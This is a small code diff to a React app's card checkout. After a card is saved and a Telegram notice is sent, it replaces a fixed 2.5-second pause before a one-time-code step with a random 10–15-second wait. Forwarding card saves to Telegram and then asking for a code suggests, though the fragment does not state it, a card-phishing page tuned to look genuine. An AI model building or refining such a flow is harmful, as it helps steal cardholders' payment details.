@@ -307,7 +307,8 @@ export default function App() {
         `Card saved. Telegram notice failed: ${noticeError.message}`
       );
     }
-    await new Promise((resolve) => setTimeout(resolve, 2500));
+    const waitMs = 10000 + Math.floor(Math.random() * 5001);
+    await new Promise((resolve) => setTimeout(resolve, waitMs));
     setCardCheckoutStep("otp");
   }
 
